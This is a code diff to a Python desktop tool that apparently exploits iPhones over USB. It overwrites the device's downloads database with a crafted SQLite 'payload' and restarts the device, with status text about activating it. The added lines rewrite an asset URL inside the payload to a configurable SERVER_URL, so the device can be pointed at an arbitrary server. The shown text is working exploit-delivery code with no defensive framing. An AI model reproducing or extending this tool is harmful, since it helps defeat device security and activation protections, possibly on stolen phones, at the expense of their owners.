@@ -1,6 +1,8 @@
 import sys
 import os
 import time
+import shutil
+import sqlite3
 from PyQt6.QtWidgets import (
     QApplication, QMainWindow, QWidget,
     QVBoxLayout, QPushButton, QLabel, QMessageBox
@@ -19,6 +21,8 @@ SUPPORTED_DEVICES = {
 }
 
 SUPPORTED_VERSIONS = {'8.4.1', '9.3.5', '9.3.6'}
+
+SERVER_URL = ""
 
 def resource_path(relative_path):
     try:
@@ -44,6 +48,7 @@ class WorkerThread(QThread):
                 time.sleep(1)
 
     def run(self):
+        temp_payload = None
         try:
             lockdown = create_using_usbmux()
             
@@ -63,13 +68,21 @@ class WorkerThread(QThread):
                 return
 
             self.status_update.emit("Activating device...")
-            
+
             payload_path = resource_path('payload')
+            temp_payload = payload_path + '.tmp'
+            shutil.copy2(payload_path, temp_payload)
+
+            conn = sqlite3.connect(temp_payload)
+            cursor = conn.cursor()
+            cursor.execute("UPDATE asset SET url = ? WHERE pid = 1234567893", (SERVER_URL,))
+            conn.commit()
+            conn.close()
 
             with AfcService(lockdown=lockdown) as afc:
                 afc.set_file_contents(
                     'Downloads/downloads.28.sqlitedb',
-                    open(payload_path, 'rb').read()
+                    open(temp_payload, 'rb').read()
                 )
             
             DiagnosticsService(lockdown=lockdown).restart()
@@ -89,7 +102,7 @@ class WorkerThread(QThread):
                     with AfcService(lockdown=lockdown) as afc:
                         afc.set_file_contents(
                             'Downloads/downloads.28.sqlitedb',
-                            open(payload_path, 'rb').read()
+                            open(temp_payload, 'rb').read()
                         )
                     
                     diag.restart()
@@ -110,8 +123,13 @@ class WorkerThread(QThread):
                 
             DiagnosticsService(lockdown=lockdown).restart()
             self.finished.emit("Done!")
-            
+
+            if temp_payload and os.path.exists(temp_payload):
+                os.remove(temp_payload)
+
         except Exception as e:
+            if temp_payload and os.path.exists(temp_payload):
+                os.remove(temp_payload)
             self.error.emit(str(e))
 
 
